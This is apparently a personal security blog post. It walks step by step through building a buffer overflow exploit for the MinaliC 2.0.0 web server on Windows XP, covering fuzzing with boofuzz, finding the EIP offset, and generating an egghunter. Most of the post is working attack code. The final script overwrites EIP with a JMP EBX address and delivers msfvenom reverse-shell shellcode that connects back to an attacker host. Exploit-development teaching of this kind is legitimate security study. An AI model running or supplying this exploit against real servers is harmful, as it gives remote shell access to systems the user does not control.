---
title: MinaliC 2.0.0 buffer overflow exploit
author: Stipe Marinovic
date: 2020-07-15 23:00:00 +0800
categories: [Blogging, Tutorial, Exploit]
tags: [fuzzing, shellcoding, exploit, bufferoverflow, bof]
toc: true
---

## Introduction ##

In this blog post we will go thru recreating buffer overflow exploit for MinaliC web server. Application can be downloaded on following URL: https://sourceforge.net/projects/minalic/.
Resources needed:
* Windows XP with debugger: Immunity Debugger or OllDbg
* Kali Linux or any other OS with python and boofuzz installed

## Fuzzing ##

Standard python script with boofuzz module and post_test_case_callback function call can be used for fuzzing. 

* Fuzzer

```
#!/usr/bin/python
import sys
from boofuzz import *

host = '172.16.24.213'
port = 80

def receive_response(target, fuzz_data_logger, session, sock):
   data=sock.recv(20000)
   if not "HTTP/1.1" in data:
      print "\n######################################################\n"
      print "[+] No data received from MinaliC server"
      print "[+] Payload length: " + str (len(session.last_send))
      print "[+] Payload saved in minalic_server_crash_report.txt"
      print "[+] Fuzzing ended"
      print "\n######################################################\n"
      f = open("minalic_server_crash_report.txt", "w")
      f.write(session.last_send)
      f.close()
      sys.exit(-1)

def main():

   session = Session(post_test_case_callbacks=[receive_response], sleep_time=0.2, target = Target(connection = SocketConnection(host, port, proto='tcp')))

   s_initialize("MiniShare GET")
   s_string("GET", fuzzable = False)
   s_delim(" ", fuzzable = False)
   s_string("/", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_delim(" ", fuzzable = False)
   s_string("HTTP/1.1", fuzzable = False)
   s_string("\r\n", fuzzable = False)

   s_string("Host:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("172.16.24.212", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_string("User-Agent", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_string("Accept:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_static("Connection: close\r\n")
   s_string("\r\n", fuzzable = False)

   # Template
   """
   GET / HTTP/1.1
   Host: 172.16.24.212
   User-Agent: Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
   Accept-Language: en-US,en;q=0.5
   Accept-Encoding: gzip, deflate
   Connection: close
   Upgrade-Insecure-Requests: 1
   """

   session.connect(s_get("MiniShare GET"))
   session.fuzz()

if __name__ == "__main__":
    main()
```

After aprox 500 test cases application finaly crashed.

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minalic_01.png?raw=true)

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minalic_02.png?raw=true)

Payload which crashed application was following:

```
GET /a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a= HTTP/1.1
Host: 172.16.24.212
User-Agent FUZZ
Accept: FUZZ
Connection: close
```

## Creating proof of concept code ##

As next step we need to reproduce crash with PoC script:

```
#!/usr/bin/python

import socket

host = "172.16.24.213"
port = 80

buffer = "GET /a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a=a= HTTP/1.1\r\n"
buffer += "Host: 172.16.24.213\r\nUser-Agent FUZZ\r\nAccept: FUZZ\r\nConnection: close\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
print ("[+] Payload sent")
s.close()
```

And it works. 

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minalic_03.png?raw=true)

Great, now we need to attach Immunity Debugger or OllyDbg to the application to inspect the crash.
  
## Analysing crash ##

When we send payload from minalic_server_crash_report.txt application is crashed but still not in a usefully way. We need to manually probe various payload lengths to overwrite EIP with values we want.   

After a bit of playing with various lengths we can conclude that EIP is overwritten by sending 221 "A"s after ```GET /``` prefix.


* Proof of concept code

```
#!/usr/bin/python

import socket, time

host = "172.16.24.213"
port = 80

x=221
buffer =  "GET /" + x * "A" + " HTTP/1.1\r\nHost: 172.16.24.212\r\nUser-Agent FUZZ\r\nAccept: FUZZ\r\nConnection: close\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
s.close()

print ("[+] Fuzzing complated")
```

* Result

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minalic_04.png?raw=true)

Sadly, non of the registers is pointing to our payload, nor we can reach it with POP, POP, POP,… RET sequence. 

After little bit of googling and research it seems that exploit is dependent on location where application is installed on the disk. 

For example, for the same payload length:

```
#!/usr/bin/python
import socket

host = "172.16.24.213"
port = 80

x=253
buffer =  "GET /" + x * "A" + " HTTP/1.1\r\n"
buffer += "Host: " + 50 * "B" + "\r\n"
buffer += "User-Agent FUZZ\r\nAccept: FUZZ\r\nConnection: close\r\n\r\n"
buffer += "C" * 360
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
s.close()
print ("[+] Fuzzing complated")
```

If application is installed in ```c:\minalic\``` path, EBX is pointing to value of Host header (BBBB...). 

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minalic_05.png?raw=true)

If application is installed in ```c:\vulnerabesoftware\minalic\``` path, besides EBX which is pointing to Host header value, ESP is pointing to last 6 bytes from URL in GET request.

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minalic_06.png?raw=true)

But if path is longer none of the registers is pointing to part of our payload, which we had at first place. We will move application to: ```c:\vulnerablesoftware\minalic\``` path so that we can continue with this walkthrough. By moving application to new folder, payload length needs to be changed to 240.


## Finding EIP location ##

In order to find EIP location, we need to send unique pattern which can be generated by msf-pattern_create script:

```
msf-pattern_create -l 240
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9
```

And sent via python script:

```
#!/usr/bin/python

import socket, time

host = "172.16.24.213"
port = 80

x=240
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9"
#buffer =  "GET /" + (x) * "A" + " HTTP/1.1\r\n"
buffer =  "GET /" + pattern + " HTTP/1.1\r\n"
buffer += "Host: " + 50 * "B" + "\r\n"
buffer += "User-Agent FUZZ\r\nAccept: FUZZ\r\nConnection: close\r\n\r\n"
buffer += "C" * 360
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
s.close()
```

The result is following:

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minalic_07.png?raw=true)

Another MetaSploit script can be used to find location of EIP value 37684136:

```
msf-pattern_offset -l 240 -q 37684136
[*] Exact match at offset 230
```

EIP is located at 230 characters after ```GET /``` prefix. We can also notice that ESP is pointing to ```Ah8Ah9``` which is the end of URL (end of our unique pattern) in GET request.
  
  
As next step, we need to find address with ```JMP ESP``` and write opcodes to jump back up the stack to reach our shellcode or find ```JMP EBX``` instruction and place egghunter in Host header and shellcode somewhere else. For practice, let's chose ```JMP EBX``` + egghunter approach.

Since this is a web server we can try our luck with usual bad characters without looking for a bad ones:

* Generate egghunter (for w00t egg):

```
/usr/bin/msf-egghunter -f python -e w00t -p windows -a x86
buf =  b""
buf += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
buf += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
buf += b"\xea\xaf\x75\xe7\xff\xe7"
```

* Generate reverse shell code:

```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=172.16.24.204 LPORT=4444 -f python -b "\x00\x0a\0d"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xdb\xde\xbe\xcb\x1f\xb0\xfc\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x52\x31\x73\x17\x83\xeb\xfc\x03\xb8\x0c\x52"
buf += b"\x09\xc2\xdb\x10\xf2\x3a\x1c\x75\x7a\xdf\x2d\xb5\x18"
buf += b"\x94\x1e\x05\x6a\xf8\x92\xee\x3e\xe8\x21\x82\x96\x1f"
buf += b"\x81\x29\xc1\x2e\x12\x01\x31\x31\x90\x58\x66\x91\xa9"
buf += b"\x92\x7b\xd0\xee\xcf\x76\x80\xa7\x84\x25\x34\xc3\xd1"
buf += b"\xf5\xbf\x9f\xf4\x7d\x5c\x57\xf6\xac\xf3\xe3\xa1\x6e"
buf += b"\xf2\x20\xda\x26\xec\x25\xe7\xf1\x87\x9e\x93\x03\x41"
buf += b"\xef\x5c\xaf\xac\xdf\xae\xb1\xe9\xd8\x50\xc4\x03\x1b"
buf += b"\xec\xdf\xd0\x61\x2a\x55\xc2\xc2\xb9\xcd\x2e\xf2\x6e"
buf += b"\x8b\xa5\xf8\xdb\xdf\xe1\x1c\xdd\x0c\x9a\x19\x56\xb3"
buf += b"\x4c\xa8\x2c\x90\x48\xf0\xf7\xb9\xc9\x5c\x59\xc5\x09"
buf += b"\x3f\x06\x63\x42\xd2\x53\x1e\x09\xbb\x90\x13\xb1\x3b"
buf += b"\xbf\x24\xc2\x09\x60\x9f\x4c\x22\xe9\x39\x8b\x45\xc0"
buf += b"\xfe\x03\xb8\xeb\xfe\x0a\x7f\xbf\xae\x24\x56\xc0\x24"
buf += b"\xb4\x57\x15\xea\xe4\xf7\xc6\x4b\x54\xb8\xb6\x23\xbe"
buf += b"\x37\xe8\x54\xc1\x9d\x81\xff\x38\x76\x02\xef\x5a\x4a"
buf += b"\x32\x12\x5a\x43\x9f\x9b\xbc\x09\x0f\xca\x17\xa6\xb6"
buf += b"\x57\xe3\x57\x36\x42\x8e\x58\xbc\x61\x6f\x16\x35\x0f"
buf += b"\x63\xcf\xb5\x5a\xd9\x46\xc9\x70\x75\x04\x58\x1f\x85"
buf += b"\x43\x41\x88\xd2\x04\xb7\xc1\xb6\xb8\xee\x7b\xa4\x40"
buf += b"\x76\x43\x6c\x9f\x4b\x4a\x6d\x52\xf7\x68\x7d\xaa\xf8"
buf += b"\x34\x29\x62\xaf\xe2\x87\xc4\x19\x45\x71\x9f\xf6\x0f"
buf += b"\x15\x66\x35\x90\x63\x67\x10\x66\x8b\xd6\xcd\x3f\xb4"
buf += b"\xd7\x99\xb7\xcd\x05\x3a\x37\x04\x8e\x4a\x72\x04\xa7"
buf += b"\xc2\xdb\xdd\xf5\x8e\xdb\x08\x39\xb7\x5f\xb8\xc2\x4c"
buf += b"\x7f\xc9\xc7\x09\xc7\x22\xba\x02\xa2\x44\x69\x22\xe7"
```

Mona can be used to find addresses with ```JMP EBX``` instruction: ```!mona findwild -s "JMP EBX"```.

![Mona results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minalic_08.png?raw=true)

Since there are several choices we can use: 77C11F13.

## Final exploit ##

After a lots of "try and fail" attempts a place for shell code was finally found. If we place egghunter in Host header and egg+shellcode in Agent header, shellcode will end up in a memory and egghunter will eventually find it.

* Final exploit code is following:

```
#!/usr/bin/python
import socket

host = "172.16.24.213"
port = 80

# JMP EBX: 77C11F13
jmp_ebx = "\x13\x1f\xc1\x77"
x=240

egg = "w00t"

#/usr/bin/msf-egghunter -f python -e w00t -p windows -a x86
egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
egghunter += b"\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=172.16.24.204 LPORT=4444 -f python -b "\x00\x0a\x0d"

buf =  b""
buf += b"\xda\xc9\xb8\x19\x14\x16\x98\xd9\x74\x24\xf4\x5f\x2b"
buf += b"\xc9\xb1\x52\x31\x47\x17\x03\x47\x17\x83\xf6\xe8\xf4"
buf += b"\x6d\xf4\xf9\x7b\x8d\x04\xfa\x1b\x07\xe1\xcb\x1b\x73"
buf += b"\x62\x7b\xac\xf7\x26\x70\x47\x55\xd2\x03\x25\x72\xd5"
buf += b"\xa4\x80\xa4\xd8\x35\xb8\x95\x7b\xb6\xc3\xc9\x5b\x87"
buf += b"\x0b\x1c\x9a\xc0\x76\xed\xce\x99\xfd\x40\xfe\xae\x48"
buf += b"\x59\x75\xfc\x5d\xd9\x6a\xb5\x5c\xc8\x3d\xcd\x06\xca"
buf += b"\xbc\x02\x33\x43\xa6\x47\x7e\x1d\x5d\xb3\xf4\x9c\xb7"
buf += b"\x8d\xf5\x33\xf6\x21\x04\x4d\x3f\x85\xf7\x38\x49\xf5"
buf += b"\x8a\x3a\x8e\x87\x50\xce\x14\x2f\x12\x68\xf0\xd1\xf7"
buf += b"\xef\x73\xdd\xbc\x64\xdb\xc2\x43\xa8\x50\xfe\xc8\x4f"
buf += b"\xb6\x76\x8a\x6b\x12\xd2\x48\x15\x03\xbe\x3f\x2a\x53"
buf += b"\x61\x9f\x8e\x18\x8c\xf4\xa2\x43\xd9\x39\x8f\x7b\x19"
buf += b"\x56\x98\x08\x2b\xf9\x32\x86\x07\x72\x9d\x51\x67\xa9"
buf += b"\x59\xcd\x96\x52\x9a\xc4\x5c\x06\xca\x7e\x74\x27\x81"
buf += b"\x7e\x79\xf2\x06\x2e\xd5\xad\xe6\x9e\x95\x1d\x8f\xf4"
buf += b"\x19\x41\xaf\xf7\xf3\xea\x5a\x02\x94\xb8\x8b\x14\xa8"
buf += b"\xa9\xa9\x24\x21\x76\x27\xc2\x2b\x96\x61\x5d\xc4\x0f"
buf += b"\x28\x15\x75\xcf\xe6\x50\xb5\x5b\x05\xa5\x78\xac\x60"
buf += b"\xb5\xed\x5c\x3f\xe7\xb8\x63\x95\x8f\x27\xf1\x72\x4f"
buf += b"\x21\xea\x2c\x18\x66\xdc\x24\xcc\x9a\x47\x9f\xf2\x66"
buf += b"\x11\xd8\xb6\xbc\xe2\xe7\x37\x30\x5e\xcc\x27\x8c\x5f"
buf += b"\x48\x13\x40\x36\x06\xcd\x26\xe0\xe8\xa7\xf0\x5f\xa3"
buf += b"\x2f\x84\x93\x74\x29\x89\xf9\x02\xd5\x38\x54\x53\xea"
buf += b"\xf5\x30\x53\x93\xeb\xa0\x9c\x4e\xa8\xd1\xd6\xd2\x99"
buf += b"\x79\xbf\x87\x9b\xe7\x40\x72\xdf\x11\xc3\x76\xa0\xe5"
buf += b"\xdb\xf3\xa5\xa2\x5b\xe8\xd7\xbb\x09\x0e\x4b\xbb\x1b"

buffer =  "GET /" + (230) * "A" + jmp_ebx + "A" * (240-230-4)  + " HTTP/1.1\r\n"
buffer += "Host: " + "\x90" * 10 + egghunter + "\r\n"
buffer += "Agent: w00tw00t" + buf + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
s.close()
```

Confirmation that exploit is working:

![Confirmation](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minalic_09.png?raw=true)



